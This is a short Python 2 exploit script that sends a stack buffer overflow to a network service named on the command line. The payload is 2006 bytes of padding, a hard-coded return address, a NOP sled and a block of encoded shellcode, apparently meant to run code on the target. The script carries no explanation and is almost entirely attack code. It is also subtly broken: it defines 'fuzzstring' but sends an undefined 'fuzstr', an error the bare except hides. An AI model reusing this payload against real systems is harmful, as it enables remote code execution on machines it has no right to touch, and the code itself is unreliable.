import socket
import sys

try:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    cmd = sys.argv[3]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    data = s.recv(4096)
    print data
    fuzzstring = "A" * 2006
    nop = "\x90" * 32
    inst = "\xAF\x11\x50\x62"
    buf =  ""
    buf += "\xbf\x67\x43\x9e\x4b\xd9\xc7\xd9\x74\x24\xf4\x5a\x31"
    buf += "\xc9\xb1\x4f\x31\x7a\x14\x83\xc2\x04\x03\x7a\x10\x85"
    buf += "\xb6\x62\xa3\xc0\x39\x9b\x34\xb2\xb0\x7e\x05\xe0\xa7"
    buf += "\x0b\x34\x34\xa3\x5e\xb5\xbf\xe1\x4a\x4e\xcd\x2d\x7c"
    buf += "\xe7\x7b\x08\xb3\xf8\x4a\x94\x1f\x3a\xcd\x68\x62\x6f"
    buf += "\x2d\x50\xad\x62\x2c\x95\xd0\x8d\x7c\x4e\x9e\x3c\x90"
    buf += "\xfb\xe2\xfc\x91\x2b\x69\xbc\xe9\x4e\xae\x49\x43\x50"
    buf += "\xff\xe2\xd8\x1a\xe7\x89\x86\xba\x16\x5d\xd5\x87\x51"
    buf += "\xea\x2d\x73\x60\x3a\x7c\x7c\x52\x02\xd2\x43\x5a\x8f"
    buf += "\x2b\x83\x5d\x70\x5e\xff\x9d\x0d\x58\xc4\xdc\xc9\xed"
    buf += "\xd9\x47\x99\x55\x3a\x79\x4e\x03\xc9\x75\x3b\x40\x95"
    buf += "\x99\xba\x85\xad\xa6\x37\x28\x62\x2f\x03\x0e\xa6\x6b"
    buf += "\xd7\x2f\xff\xd1\xb6\x50\x1f\xbd\x67\xf4\x6b\x2c\x73"
    buf += "\x8e\x31\x39\xb0\xbc\xc9\xb9\xde\xb7\xba\x8b\x41\x63"
    buf += "\x55\xa0\x0a\xad\xa2\xc7\x20\x09\x3c\x36\xcb\x69\x14"
    buf += "\xfd\x9f\x39\x0e\xd4\x9f\xd2\xce\xd9\x75\x74\x9f\x75"
    buf += "\x26\x34\x4f\x36\x96\xdc\x85\xb9\xc9\xfc\xa5\x13\x7c"
    buf += "\x3b\x31\x30\x67\xe9\xca\x20\x9a\xed\xea\x55\x13\x0b"
    buf += "\x80\x85\x72\x84\x3d\x3f\xdf\x5e\xdf\xc0\xf5\xf6\x7c"
    buf += "\x52\x92\x06\x0a\x4f\x0d\x51\x5b\xa1\x44\x37\x71\x98"
    buf += "\xfe\x25\x88\x7c\x38\xed\x57\xbd\xc7\xec\x1a\xf9\xe3"
    buf += "\xfe\xe2\x02\xa8\xaa\xba\x54\x66\x04\x7d\x0f\xc8\xfe"
    buf += "\xd7\xfc\x82\x96\xae\xce\x14\xe0\xae\x1a\xe3\x0c\x1e"
    buf += "\xf3\xb2\x33\xaf\x93\x32\x4c\xcd\x03\xbc\x87\x55\x33"
    buf += "\xf7\x85\xfc\xdc\x5e\x5c\xbd\x80\x60\x8b\x82\xbc\xe2"
    buf += "\x39\x7b\x3b\xfa\x48\x7e\x07\xbc\xa1\xf2\x18\x29\xc5"
    buf += "\xa1\x19\x78"
    servercmd = cmd + " ." + fuzstr + inst + nop + buf
    s.send(servercmd)
    print servercmd
    data = s.recv(4096)
    print data
except:
	print "EXCEPTION"
	pass